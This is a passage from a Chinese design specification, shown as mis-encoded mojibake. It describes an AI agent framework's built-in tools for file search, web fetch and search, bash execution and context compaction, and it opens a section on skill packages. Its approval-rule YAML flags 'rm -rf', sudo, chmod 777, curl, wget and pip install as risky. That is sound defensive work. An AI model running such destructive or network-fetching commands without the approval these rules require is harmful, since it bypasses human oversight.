4. **æ–‡ä»¶æ•´ç†**: åˆ—å‡ºoutputs/ç›®å½•ä¸‹çš„æ‰€æœ‰ç”Ÿæˆæ–‡ä»¶

**ä¸search_fileå¯¹æ¯”**:

| ç‰¹æ€§ | find_files | search_file |
|------|-----------|-------------|
| æœç´¢ç›®æ ‡ | æ–‡ä»¶å | æ–‡ä»¶å†…å®¹ |
| æœç´¢é€Ÿåº¦ | <10ms | é¦–æ¬¡2-5s, åç»­<100ms |
| ç´¢å¼•éœ€æ±‚ | æ—  | éœ€è¦ |
| é€‚ç”¨åœºæ™¯ | çŸ¥é“æ–‡ä»¶å/ç±»å‹ | çŸ¥é“å†…å®¹å…³é”®è¯ |

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒæ ‡å‡†globæ¨¡å¼è¯­æ³•
- âœ… é€’å½’æœç´¢æ­£å¸¸å·¥ä½œ
- âœ… æœç´¢èŒƒå›´é™åˆ¶åœ¨workspaceå†…
- âœ… è¿”å›ç›¸å¯¹è·¯å¾„(workspaceç›¸å¯¹)
- âœ… æœç´¢æ—¶é—´<10ms

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/find_files.py`

---

#### FR-TOOL-011: search_fileå·¥å…· - æ–‡ä»¶å†…å®¹æœç´¢

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒæ–‡ä»¶å†…å®¹å…¨æ–‡æœç´¢,ä½¿ç”¨SQLite FTS5ç´¢å¼•å®ç°é«˜æ€§èƒ½æœç´¢,æ”¯æŒä¸­æ–‡åˆ†è¯ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **æ–‡æœ¬æ–‡ä»¶**: å®æ—¶é€è¡Œæ‰«æ + ä¸Šä¸‹æ–‡
- âœ… **æ–‡æ¡£æ–‡ä»¶**: ç´¢å¼•æœç´¢(PDF/DOCX/XLSX/PPTX)
- âœ… **ä¸­æ–‡åˆ†è¯**: Jiebaæ™ºèƒ½åˆ†è¯
- âœ… **BM25æ’åº**: ç›¸å…³æ€§æ’åºç®—æ³•
- âœ… **N-gramåŒ¹é…**: trigram(10åˆ†) > bigram(5åˆ†) > unigram(2åˆ†)
- âœ… **è‡ªåŠ¨ç´¢å¼•**: é¦–æ¬¡æœç´¢è‡ªåŠ¨å»ºç«‹ç´¢å¼•
- âœ… **å…¨å±€ç¼“å­˜**: MD5æŒ‡çº¹å»é‡,è·¨ä¼šè¯å…±äº«ç´¢å¼•

**æœç´¢ç­–ç•¥**:

**æ–‡æœ¬æ–‡ä»¶**(å®æ—¶æ‰«æ):
```python
search_file("error.log", "ERROR")
â†’ å®æ—¶æ‰«æ,è¿”å›åŒ¹é…è¡Œå’Œä¸Šä¸‹æ–‡
â†’ æ— ç´¢å¼•å¼€é”€
â†’ é€‚åˆå°æ–‡ä»¶(<10MB)
```

**æ–‡æ¡£æ–‡ä»¶**(ç´¢å¼•æœç´¢):
```python
# é¦–æ¬¡æœç´¢
search_file("uploads/report.pdf", "Q3è¥æ”¶")
â†’ [å»ºç«‹ç´¢å¼•: 2-5ç§’]
â†’ [ä¸­æ–‡åˆ†è¯: "Q3" + "è¥æ”¶"]
â†’ [BM25æ’åº]
â†’ è¿”å›åŒ¹é…ç‰‡æ®µ + é¡µç 

# åç»­æœç´¢
search_file("uploads/report.pdf", "åˆ©æ¶¦ç‡")
â†’ [ä½¿ç”¨ç°æœ‰ç´¢å¼•: <100ms]
â†’ è¿”å›åŒ¹é…ç‰‡æ®µ + é¡µç 
```

**ç´¢å¼•æŠ€æœ¯**:
- âœ… **SQLite FTS5**: å…¨æ–‡æœç´¢å¼•æ“
- âœ… **Jiebaåˆ†è¯**: ä¸­æ–‡æ™ºèƒ½åˆ†è¯("Q3è¥æ”¶" â†’ ["Q3", "è¥æ”¶"])
- âœ… **BM25æ’åº**: TF-IDFç›¸å…³æ€§æ’åº
- âœ… **N-gramåŒ¹é…**:
  - Trigram match(çŸ­è¯­): 10åˆ†
  - Bigram match(è¯ç»„): 5åˆ†
  - Unigram match(å•è¯): 2åˆ†

**ç´¢å¼•ç®¡ç†**:
- âœ… **MD5æŒ‡çº¹**: ç›¸åŒå†…å®¹å…±äº«ç´¢å¼•(å»é‡)
- âœ… **å…¨å±€ç¼“å­˜**: `data/indexes/{md5}/index.db`
- âœ… **è‡ªåŠ¨æ¸…ç†**: 24å°æ—¶æœªä½¿ç”¨æ ‡è®°ä¸ºé™ˆæ—§
- âœ… **è‡ªåŠ¨æ›´æ–°**: æ–‡ä»¶å˜åŒ–æ—¶åˆ é™¤æ—§ç´¢å¼•,åˆ›å»ºæ–°ç´¢å¼•

**åˆ†å—ç­–ç•¥**:

| æ ¼å¼ | åˆ†å—ç­–ç•¥ | ç†ç”± |
|------|----------|------|
| PDF | æŒ‰é¡µ(1é¡µ/å—) | ä¿ç•™è¡¨æ ¼å®Œæ•´æ€§ |
| DOCX | æŒ‰æ®µè½(~1000å­—ç¬¦, 20%é‡å ) | ä¿æŒå¯è¯»æ€§,é¿å…è¾¹ç•Œæˆªæ–­ |
| XLSX | æŒ‰è¡¨(1ä¸ªè¡¨/å—) | é€»è¾‘å•å…ƒå®Œæ•´ |
| PPTX | æŒ‰å¹»ç¯ç‰‡(1å¼ /å—) | è¯­ä¹‰å®Œæ•´ |

**æ€§èƒ½æŒ‡æ ‡**:
- é¦–æ¬¡æœç´¢(50é¡µPDF): 2-5ç§’(å»ºç«‹ç´¢å¼•)
- åç»­æœç´¢: <100ms(ä½¿ç”¨ç´¢å¼•)
- ç´¢å¼•å¤§å°: åŸæ–‡ä»¶çš„20-30%
- æœç´¢å‡†ç¡®ç‡: +40-60%(å¯¹æ¯”æ— ç´¢å¼•)

**ä½¿ç”¨åœºæ™¯**:
1. **å…³é”®è¯æœç´¢**: "æ‰¾åˆ°æŠ¥å‘Šä¸­æ‰€æœ‰æåˆ°'Q3è¥æ”¶'çš„åœ°æ–¹"
2. **é—®é¢˜å®šä½**: "æœç´¢é”™è¯¯æ—¥å¿—ä¸­çš„'OutOfMemory'"
3. **æ•°æ®æŸ¥æ‰¾**: "åœ¨Excelä¸­æœç´¢'å®¢æˆ·æµå¤±ç‡'"
4. **æ–‡æ¡£åˆ†æ**: "æ‰¾å‡ºPDFä¸­æ‰€æœ‰å…³äº'é£é™©è¯„ä¼°'çš„æ®µè½"

**éªŒæ”¶æ ‡å‡†**:
- âœ… é¦–æ¬¡æœç´¢è‡ªåŠ¨å»ºç«‹ç´¢å¼•
- âœ… åç»­æœç´¢å“åº”æ—¶é—´<100ms
- âœ… ä¸­æ–‡åˆ†è¯å‡†ç¡®(è¯†åˆ«"è¥æ”¶"è€Œé"è¥"+"æ”¶")
- âœ… çŸ­è¯­åŒ¹é…ä¼˜å…ˆçº§é«˜äºå•è¯åŒ¹é…
- âœ… ç›¸åŒæ–‡ä»¶ä¸é‡å¤ç´¢å¼•(MD5å»é‡)
- âœ… è¿”å›ç»“æœåŒ…å«ç‰‡æ®µå†…å®¹å’Œä½ç½®(é¡µç /è¡Œå·)

**å‚è€ƒä»£ç **:
- `generalAgent/tools/builtin/search_file.py`
- `generalAgent/utils/text_indexer.py`
- `generalAgent/utils/document_extractors.py`

---

#### FR-TOOL-012: list_workspace_fileså·¥å…· - ç›®å½•åˆ—è¡¨

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒåˆ—å‡ºworkspaceç›®å½•å†…å®¹,å¸®åŠ©Agentäº†è§£å¯ç”¨æ–‡ä»¶ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **åˆ—å‡ºç›®å½•**: æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•
- âœ… **é€’å½’é€‰é¡¹**: å¯é€‰æ‹©æ˜¯å¦é€’å½’åˆ—å‡ºå­ç›®å½•
- âœ… **æ–‡ä»¶ä¿¡æ¯**: æ˜¾ç¤ºæ–‡ä»¶å¤§å°ã€ç±»å‹ã€ä¿®æ”¹æ—¶é—´
- âœ… **å®‰å…¨é™åˆ¶**: åªèƒ½åˆ—å‡ºworkspaceå†…çš„ç›®å½•

**è¾“å‡ºç¤ºä¾‹**:
```
workspace/
â”œâ”€â”€ skills/
â”‚   â””â”€â”€ pdf/
â”‚       â”œâ”€â”€ SKILL.md (5.2KB)
â”‚       â””â”€â”€ scripts/ (dir)
â”œâ”€â”€ uploads/
â”‚   â”œâ”€â”€ report.pdf (2.3MB)
â”‚   â””â”€â”€ data.xlsx (156KB)
â”œâ”€â”€ outputs/
â”‚   â””â”€â”€ summary.md (12KB)
â””â”€â”€ temp/
    â””â”€â”€ cache.json (3KB)
```

**ä½¿ç”¨åœºæ™¯**:
1. **æ–‡ä»¶ç›˜ç‚¹**: "åˆ—å‡ºæˆ‘ä¸Šä¼ äº†å“ªäº›æ–‡ä»¶"
2. **æŸ¥çœ‹æŠ€èƒ½**: "çœ‹çœ‹pdfæŠ€èƒ½åŒ…å«å“ªäº›è„šæœ¬"
3. **æ£€æŸ¥è¾“å‡º**: "å·²ç»ç”Ÿæˆäº†å“ªäº›æ–‡ä»¶?"
4. **æ¸…ç†å‡†å¤‡**: "tempç›®å½•é‡Œæœ‰ä»€ä¹ˆä¸´æ—¶æ–‡ä»¶?"

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ˜¾ç¤ºæ–‡ä»¶å¤§å°(äººç±»å¯è¯»æ ¼å¼)
- âœ… åŒºåˆ†æ–‡ä»¶å’Œç›®å½•
- âœ… è·¯å¾„å¿…é¡»åœ¨workspaceå†…
- âœ… å“åº”æ—¶é—´<100ms

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/file_ops.py:list_workspace_files`

---

### ç½‘ç»œå·¥å…·éœ€æ±‚

#### FR-TOOL-013: fetch_webå·¥å…· - ç½‘é¡µå†…å®¹è·å–

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒè·å–ç½‘é¡µå†…å®¹å¹¶è½¬æ¢ä¸ºLLMå‹å¥½çš„Markdownæ ¼å¼ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **HTMLè½¬Markdown**: è‡ªåŠ¨æ¸…ç†HTMLæ ‡ç­¾
- âœ… **æå–æ­£æ–‡**: å»é™¤å¯¼èˆªã€å¹¿å‘Šã€ä¾§è¾¹æ 
- âœ… **ä¿ç•™ç»“æ„**: æ ‡é¢˜ã€åˆ—è¡¨ã€è¡¨æ ¼ã€é“¾æ¥
- âœ… **å›¾ç‰‡å¤„ç†**: ä¿ç•™å›¾ç‰‡URLå’Œaltæ–‡æœ¬
- âœ… **ä»£ç é«˜äº®**: ä¿ç•™ä»£ç å—æ ¼å¼å’Œè¯­è¨€æ ‡è®°

**ä½¿ç”¨åœºæ™¯**:
1. **è·å–æ–‡æ¡£**: "è·å–Pythonå®˜æ–¹æ–‡æ¡£å…³äºæ–°ç‰¹æ€§çš„é¡µé¢"
2. **æ–°é—»é˜…è¯»**: "è·å–è¿™ç¯‡æŠ€æœ¯æ–°é—»çš„å†…å®¹"
3. **æ•™ç¨‹å­¦ä¹ **: "ä¸‹è½½è¿™ä¸ªæ•™ç¨‹é¡µé¢ä»¥ä¾¿ç¦»çº¿é˜…è¯»"
4. **APIæ–‡æ¡£**: "è·å–è¿™ä¸ªAPIçš„æ–‡æ¡£é¡µé¢"

**é”™è¯¯å¤„ç†**:
- âœ… URLæ— æ•ˆ: è¿”å›"æ— æ•ˆçš„URLæ ¼å¼"
- âœ… é¡µé¢ä¸å­˜åœ¨: è¿”å›"404 Not Found"
- âœ… ç½‘ç»œè¶…æ—¶: è¿”å›"è¯·æ±‚è¶…æ—¶,è¯·ç¨åé‡è¯•"
- âœ… åçˆ¬è™«æ‹¦æˆª: è¿”å›"é¡µé¢è®¿é—®è¢«æ‹’ç»"

**éªŒæ”¶æ ‡å‡†**:
- âœ… æˆåŠŸè·å–ä¸»æµç½‘ç«™å†…å®¹
- âœ… Markdownæ ¼å¼æ­£ç¡®(æ ‡é¢˜ã€åˆ—è¡¨ã€ä»£ç å—)
- âœ… å¹¿å‘Šå’Œå¯¼èˆªè¢«è¿‡æ»¤
- âœ… ä»£ç å—ä¿ç•™è¯­è¨€æ ‡è®°
- âœ… é”™è¯¯ä¿¡æ¯æ¸…æ™°å‹å¥½

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/jina_fetch.py`
- ä¼šæ”¹ä¸ºçº³ç±³ç›¸å…³çš„æœåŠ¡å®ç°

---

#### FR-TOOL-014: search_webå·¥å…· - ç½‘ç»œæœç´¢

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒç½‘ç»œæœç´¢,è¿”å›LLMä¼˜åŒ–çš„æœç´¢ç»“æœ,æ”¯æŒå¹¶è¡Œå†…å®¹æ¸…æ´—ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **å¤šç»“æœ**: æ”¯æŒnum_resultså‚æ•°(1-10)
- âœ… **å†…å®¹æ¸…æ´—**: ä½¿ç”¨LLMæ¸…æ´—æœç´¢ç»“æœ(å¯é€‰)
- âœ… **å¹¶è¡Œæ¸…æ´—**: asyncioå¹¶å‘æ¸…æ´—å¤šä¸ªç»“æœ(~80%æ—¶é—´èŠ‚çœ)
- âœ… **å¹¶å‘é™åˆ¶**: Semaphore(10)é˜²æ­¢APIé™æµ
- âœ… **é”™è¯¯æ¢å¤**: å•ä¸ªæ¸…æ´—å¤±è´¥ä¸å½±å“å…¶ä»–ç»“æœ

**Jina Search API**:
```
GET https://s.jina.ai/{query}?count={num_results}
```
- ä¼šæ”¹ä¸ºçº³ç±³ç›¸å…³çš„æœåŠ¡å®ç°

**ä½¿ç”¨åœºæ™¯**:
1. **å¿«é€Ÿè°ƒç ”**: "æœç´¢Python 3.13çš„ä¸»è¦æ–°ç‰¹æ€§"
2. **é—®é¢˜è§£å†³**: "æœç´¢å¦‚ä½•è§£å†³Dockerå®¹å™¨å¯åŠ¨å¤±è´¥"
3. **èµ„æ–™æ”¶é›†**: "æœç´¢å…³äºAgentæ¶æ„çš„æœ€ä½³å®è·µ"
4. **æ–°é—»æŸ¥è¯¢**: "æœç´¢æœ€æ–°çš„AIè¡Œä¸šåŠ¨æ€"

**éªŒæ”¶æ ‡å‡†**:
- âœ… è¿”å›num_resultsä¸ªç»“æœ
- âœ… æ¯ä¸ªç»“æœåŒ…å«titleã€snippetã€url
- âœ… å¹¶è¡Œæ¸…æ´—æ­£å¸¸å·¥ä½œ
- âœ… å•ä¸ªæ¸…æ´—å¤±è´¥ä¸å½±å“å…¶ä»–
- âœ… æ€»æ—¶é—´â‰ˆmax(å•ä¸ªæ¸…æ´—æ—¶é—´)

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/jina_search.py`

---

### æ‰§è¡Œå·¥å…·éœ€æ±‚

#### FR-TOOL-015: run_bash_commandå·¥å…· - Bashå‘½ä»¤æ‰§è¡Œ

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒåœ¨workspaceä¸­æ‰§è¡Œbashå‘½ä»¤å’ŒPythonè„šæœ¬,ç”¨äºè¿è¡ŒæŠ€èƒ½åŒ…è„šæœ¬å’Œç³»ç»Ÿæ“ä½œã€‚
- Windows å¹³å°ä½¿ç”¨å‘½ä»¤è¡Œ

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **Bashå‘½ä»¤**: æ‰§è¡Œä»»æ„bashå‘½ä»¤
- âœ… **Pythonè„šæœ¬**: æ‰§è¡ŒæŠ€èƒ½åŒ…ä¸­çš„Pythonè„šæœ¬
- âœ… **Timeout**: é»˜è®¤30ç§’,å¯é…ç½®
- âœ… **ç¯å¢ƒå˜é‡**: è‡ªåŠ¨è®¾ç½®AGENT_WORKSPACE_PATH
- âœ… **å·¥ä½œç›®å½•**: é»˜è®¤ä¸ºworkspaceè·¯å¾„
- âœ… **æ ‡å‡†è¾“å‡º**: æ•è·stdoutå’Œstderr

**å®‰å…¨æ§åˆ¶**(é€šè¿‡HITL):
- âœ… **é»˜è®¤éœ€å®¡æ‰¹**: æ‰€æœ‰å‘½ä»¤é»˜è®¤éœ€è¦äººå·¥å®¡æ‰¹
- âœ… **é£é™©æ£€æµ‹**: æ£€æµ‹rm -rfã€sudoã€chmod 777ç­‰
- âœ… **è·¯å¾„éš”ç¦»**: é™åˆ¶åœ¨workspaceå†…æ‰§è¡Œ
- âœ… **Timeoutä¿æŠ¤**: é˜²æ­¢æ— é™æ‰§è¡Œ

**å®¡æ‰¹è§„åˆ™**(hitl_rules.yaml):
```yaml
tools:
  run_bash_command:
    enabled: true
    patterns:
      high_risk:
        - "rm\\s+-rf"       # é€’å½’åˆ é™¤
        - "sudo"            # è¶…çº§ç”¨æˆ·
        - "chmod\\s+777"    # å±é™©æƒé™
      medium_risk:
        - "curl"            # ç½‘ç»œè¯·æ±‚
        - "wget"            # ä¸‹è½½æ–‡ä»¶
        - "pip\\s+install"  # å®‰è£…åŒ…
    actions:
      high_risk: require_approval
      medium_risk: require_approval
```

**ä½¿ç”¨åœºæ™¯**:
1. **è¿è¡ŒæŠ€èƒ½è„šæœ¬**:
   ```bash
   python skills/pdf/scripts/fill_fillable_fields.py uploads/form.pdf outputs/filled.pdf
   ```

2. **æ–‡ä»¶æ“ä½œ**:
   ```bash
   ls -lh uploads/
   cp uploads/file.txt outputs/backup.txt
   ```

3. **æ•°æ®å¤„ç†**:
   ```bash
   cat uploads/data.csv | grep "error" > outputs/errors.txt
   ```

4. **ç³»ç»Ÿæ£€æŸ¥**:
   ```bash
   df -h  # æ£€æŸ¥ç£ç›˜ç©ºé—´
   ps aux | grep python  # æ£€æŸ¥è¿›ç¨‹
   ```

**å®¡æ‰¹ç”¨æˆ·ä½“éªŒ**:
```
Agent> [Calls run_bash_command("rm -rf outputs/old_files/")]

ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command
   åŸå› : æ£€æµ‹åˆ°å±é™©å‘½ä»¤(é€’å½’åˆ é™¤)
   å‘½ä»¤: rm -rf outputs/old_files/
   æ‰¹å‡†? [y/n] > y

Agent> å·²åˆ é™¤æ—§æ–‡ä»¶ã€‚
```

**é”™è¯¯å¤„ç†**:
- âœ… å‘½ä»¤ä¸å­˜åœ¨: "Command not found: xxx"
- âœ… æƒé™ä¸è¶³: "Permission denied"
- âœ… è¶…æ—¶: "Command timed out after 30s"
- âœ… éé›¶é€€å‡º: "Command failed with exit code 1"

**éªŒæ”¶æ ‡å‡†**:
- âœ… å±é™©å‘½ä»¤è§¦å‘HITLå®¡æ‰¹
- âœ… å®‰å…¨å‘½ä»¤(ls/pwd/cat)è‡ªåŠ¨é€šè¿‡
- âœ… Timeoutæ­£å¸¸å·¥ä½œ
- âœ… ç¯å¢ƒå˜é‡AGENT_WORKSPACE_PATHæ­£ç¡®è®¾ç½®
- âœ… æ•è·å®Œæ•´çš„stdoutå’Œstderr

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/run_bash_command.py`

---

### ä¸Šä¸‹æ–‡ç®¡ç†å·¥å…·éœ€æ±‚

#### FR-TOOL-016: compact_contextå·¥å…· - æ‰‹åŠ¨å‹ç¼©ä¸Šä¸‹æ–‡

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒæ‰‹åŠ¨è§¦å‘ä¸Šä¸‹æ–‡å‹ç¼©,åœ¨Tokenä½¿ç”¨ç‡è¾¾åˆ°é˜ˆå€¼æ—¶å¯åŠ¨æ€åŠ è½½ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **æ‰‹åŠ¨è§¦å‘**: Agentå¯ä¸»åŠ¨è°ƒç”¨å‹ç¼©
- âœ… **ç­–ç•¥é€‰æ‹©**: æ”¯æŒ"compact"å’Œ"truncate"ä¸¤ç§ç­–ç•¥
- âœ… **åŠ¨æ€åŠ è½½**: é»˜è®¤ç¦ç”¨,Token>75%æ—¶é€šè¿‡@mentionåŠ è½½
- âœ… **ä¸è‡ªåŠ¨å‹ç¼©ååŒ**: å¯ä½œä¸ºè‡ªåŠ¨å‹ç¼©çš„è¡¥å……

**å‹ç¼©ç­–ç•¥**:

**1. compactç­–ç•¥**(æ¨è):
- ä½¿ç”¨LLMæ€»ç»“æ—§æ¶ˆæ¯
- ä¿ç•™è¿‘æœŸæ¶ˆæ¯(15%çª—å£æˆ–10æ¡)
- å‹ç¼©æ¯”: 90-95%

**2. truncateç­–ç•¥**(ç´§æ€¥):
- ç›´æ¥æˆªæ–­,ä¿ç•™æœ€è¿‘Næ¡
- æ— LLMè°ƒç”¨å¼€é”€
- å‹ç¼©æ¯”: å–å†³äºä¿ç•™æ¶ˆæ¯æ•°

**åŠ¨æ€åŠ è½½æœºåˆ¶**:

è§¦å‘è­¦æŠ¥ æ¯”å¦‚ 75% çš„æ—¶å€™ï¼Œä¼šæé†’æ¨¡å‹ä½¿ç”¨ @compact_context å·¥å…·å‹ç¼©ä¸Šä¸‹æ–‡

```python
# Tokenä½¿ç”¨ç‡ç›‘æ§
if cumulative_prompt_tokens / context_window > 0.75:
    # ç”Ÿæˆæé†’
    reminder = """
    âš ï¸ Tokenä½¿ç”¨ç‡: 78%
    å¯ç”¨ @compact_context å·¥å…·å‹ç¼©ä¸Šä¸‹æ–‡
    """
    # åŠ¨æ€åŠ è½½å·¥å…·
    tool_registry.load_on_demand("compact_context")
```

**ä½¿ç”¨åœºæ™¯**:
1. **é¢„é˜²æ€§å‹ç¼©**: Tokenä½¿ç”¨ç‡è¾¾åˆ°75%æ—¶ä¸»åŠ¨å‹ç¼©
2. **ç´§æ€¥å‹ç¼©**: æ¥è¿‘ä¸Šé™æ—¶å¿«é€Ÿé‡Šæ”¾ç©ºé—´
3. **æµ‹è¯•å‹ç¼©**: å¼€å‘æ—¶æµ‹è¯•å‹ç¼©æ•ˆæœ

**ä¸è‡ªåŠ¨å‹ç¼©å¯¹æ¯”**:

| ç‰¹æ€§ | compact_context(æ‰‹åŠ¨) | è‡ªåŠ¨å‹ç¼©(95%è§¦å‘) |
|------|----------------------|------------------|
| è§¦å‘æ–¹å¼ | Agentä¸»åŠ¨è°ƒç”¨ | ç³»ç»Ÿè‡ªåŠ¨è§¦å‘ |
| è§¦å‘æ—¶æœº | ä»»æ„æ—¶å€™ | Token>95% |
| ç”¨æˆ·æ„ŸçŸ¥ | å·¥å…·è°ƒç”¨å¯è§ | å®Œå…¨é™é»˜ |
| é€‚ç”¨åœºæ™¯ | é¢„é˜²æ€§å‹ç¼©ã€æµ‹è¯• | ç”Ÿäº§ç¯å¢ƒè‡ªåŠ¨ç®¡ç† |

**éªŒæ”¶æ ‡å‡†**:
- âœ… é»˜è®¤ä¸åŠ è½½(enabled: false)
- âœ… Token>75%æ—¶æé†’å¯ç”¨
- âœ… @mentionåæˆåŠŸåŠ è½½
- âœ… compactç­–ç•¥æ­£å¸¸å·¥ä½œ
- âœ… truncateç­–ç•¥æ­£å¸¸å·¥ä½œ
- âœ… å‹ç¼©åTokenä½¿ç”¨ç‡<10%

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/compact_context.py`

---

## æ·»åŠ è‡ªå®šä¹‰å·¥å…·

### æ­¥éª¤1: åˆ›å»ºå·¥å…·æ–‡ä»¶

åœ¨`generalAgent/tools/custom/`åˆ›å»º`my_tool.py`:

```python
from langchain_core.tools import tool

@tool
def my_custom_tool(param1: str, param2: int = 10) -> str:
    """ç®€çŸ­æè¿°å·¥å…·åŠŸèƒ½

    Args:
        param1: å‚æ•°1è¯´æ˜
        param2: å‚æ•°2è¯´æ˜(å¯é€‰)

    Returns:
        æ‰§è¡Œç»“æœ
    """
    # å®ç°é€»è¾‘
    return f"Result: {param1} with {param2}"
```

### æ­¥éª¤2: æ·»åŠ é…ç½®(å¯é€‰)

åœ¨`tools.yaml`ä¸­æ·»åŠ :

```yaml
optional:
  my_custom_tool:
    enabled: true
    category: "custom"
    tags: ["utility"]
    description: "æˆ‘çš„è‡ªå®šä¹‰å·¥å…·"
```

### æ­¥éª¤3: é‡å¯åº”ç”¨

å·¥å…·è‡ªåŠ¨å‘ç°å¹¶åŠ è½½,æ— éœ€ä¿®æ”¹ä»£ç ã€‚

---

## å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| å·¥å…·æ³¨å†Œè¡¨ | `generalAgent/tools/registry.py` |
| å·¥å…·æ‰«æå™¨ | `generalAgent/tools/discovery.py` |
| å·¥å…·é…ç½® | `generalAgent/config/tools.yaml` |
| å†…ç½®å·¥å…·ç›®å½• | `generalAgent/tools/builtin/` |
| è‡ªå®šä¹‰å·¥å…·ç›®å½• | `generalAgent/tools/custom/` |
| MCPé›†æˆ | `generalAgent/tools/mcp_integration.py` |

---

# äºŒã€æŠ€èƒ½ç³»ç»Ÿï¼ˆSkillsï¼‰

## äº§å“å®šä½

æŠ€èƒ½ç³»ç»Ÿæ˜¯æ¡†æ¶çš„çŸ¥è¯†å¢å¼ºå±‚,é€šè¿‡SKILL.mdæ–‡æ¡£+å¯æ‰§è¡Œè„šæœ¬çš„ç»„åˆ,ä¸ºAI Agentæä¾›é¢†åŸŸä¸“ä¸šçŸ¥è¯†å’Œä¸“ä¸šå·¥å…·èƒ½åŠ›ã€‚æŠ€èƒ½æ˜¯**çŸ¥è¯†åŒ…**è€Œéå·¥å…·å®¹å™¨,Agenté€šè¿‡é˜…è¯»SKILL.mdè·å–æŒ‡å¯¼,é€šè¿‡æ‰§è¡Œscriptså®Œæˆä¸“ä¸šæ“ä½œã€‚ç³»ç»Ÿæ”¯æŒä¾èµ–è‡ªåŠ¨å®‰è£…ã€æ–‡ä»¶ç±»å‹è‡ªåŠ¨åŠ è½½ã€å·¥ä½œåŒºéš”ç¦»ã€‚

**æ ¸å¿ƒä»·å€¼**:
- **çŸ¥è¯†ä¼ é€’**: SKILL.mdæ–‡æ¡£åŒ–ä¸“ä¸šçŸ¥è¯†,Agenté˜…è¯»åå³å¯æ‰§è¡Œ
- **ä¸“ä¸šèƒ½åŠ›**: å†…ç½®æŠ€èƒ½è¦†ç›–PDF/Officeæ–‡æ¡£å¤„ç†ã€Artifactsç”Ÿæˆ
- **è‡ªåŠ¨å®‰è£…**: requirements.txtä¾èµ–è‡ªåŠ¨å®‰è£…,æ— éœ€æ‰‹åŠ¨é…ç½®
- **æŒ‰éœ€åŠ è½½**: @mentionæˆ–æ–‡ä»¶ä¸Šä¼ è§¦å‘,èŠ‚çœç³»ç»Ÿèµ„æº

---

## å†…ç½®æŠ€èƒ½æ¸…å•

| æŠ€èƒ½ID | åç§° | åŠŸèƒ½ | è‡ªåŠ¨è§¦å‘ |
|--------|------|------|---------|
| `pdf` | PDFå¤„ç† | è¡¨å•å¡«å†™ã€é¡µé¢æå–ã€åˆå¹¶æ‹†åˆ†ã€è½¬æ¢ | ä¸Šä¼ .pdfæ–‡ä»¶ |
| `docx` | Wordå¤„ç† | åˆ›å»º/ç¼–è¾‘ã€Redliningä¿®è®¢ã€é‚®ä»¶åˆå¹¶ | ä¸Šä¼ .docxæ–‡ä»¶ |
| `xlsx` | Excelå¤„ç† | æ•°æ®åˆ†æã€è´¢åŠ¡å»ºæ¨¡ã€å›¾è¡¨ç”Ÿæˆ | ä¸Šä¼ .xlsxæ–‡ä»¶ |
| `pptx` | PowerPointå¤„ç† | åˆ›å»ºæ¼”ç¤ºæ–‡ç¨¿ã€æ¨¡æ¿åº”ç”¨ | ä¸Šä¼ .pptxæ–‡ä»¶ |
| `artifacts-builder` | å¯äº¤ä»˜ç‰©ç”Ÿæˆ | HTML/SVG/Mermaid/Reactç»„ä»¶ | @mention |
| `skill-creator` | æŠ€èƒ½åˆ›å»ºå™¨ | å¿«é€Ÿåˆ›å»ºæ–°æŠ€èƒ½åŒ… | @mention |

---

## æŠ€èƒ½ç»“æ„

### æ ‡å‡†ç›®å½•ç»“æ„

```
generalAgent/skills/{skill_id}/
â”œâ”€â”€ SKILL.md              # æ ¸å¿ƒæ–‡æ¡£(å¿…éœ€)
â”‚   â”œâ”€â”€ æŠ€èƒ½æ¦‚è¿°
â”‚   â”œâ”€â”€ ä½¿ç”¨æŒ‡å—
â”‚   â”œâ”€â”€ å·¥ä½œæµç¨‹
â”‚   â””â”€â”€ è„šæœ¬å¼•ç”¨
â”‚
â”œâ”€â”€ requirements.txt      # Pythonä¾èµ–(å¯é€‰)
â”‚   â””â”€â”€ pypdf2>=3.0.0
â”‚
â”œâ”€â”€ reference.md          # æ‰©å±•å‚è€ƒ(å¯é€‰)
â”‚   â””â”€â”€ APIæ–‡æ¡£ã€æœ€ä½³å®è·µ
â”‚
â””â”€â”€ scripts/              # å¯æ‰§è¡Œè„šæœ¬(å¯é€‰)
    â”œâ”€â”€ extract_text.py
    â”œâ”€â”€ fill_form.py
    â””â”€â”€ merge_pdfs.py
```

### SKILL.mdç¤ºä¾‹

```markdown
# PDFå¤„ç†æŠ€èƒ½

## æŠ€èƒ½æ¦‚è¿°
æœ¬æŠ€èƒ½æä¾›PDFæ–‡æ¡£çš„ä¸“ä¸šå¤„ç†èƒ½åŠ›,åŒ…æ‹¬:
- è¡¨å•å¡«å†™(å¯å¡«å†™å­—æ®µå’Œä¸å¯å¡«å†™å­—æ®µ)
- é¡µé¢æå–ã€åˆå¹¶ã€æ‹†åˆ†
- æ ¼å¼è½¬æ¢(PDFâ†”å›¾ç‰‡ã€Word)

## ä½¿ç”¨æŒ‡å—

### åœºæ™¯1: å¡«å†™PDFè¡¨å•

#### å¯å¡«å†™è¡¨å•(æœ‰è¡¨å•å­—æ®µ)
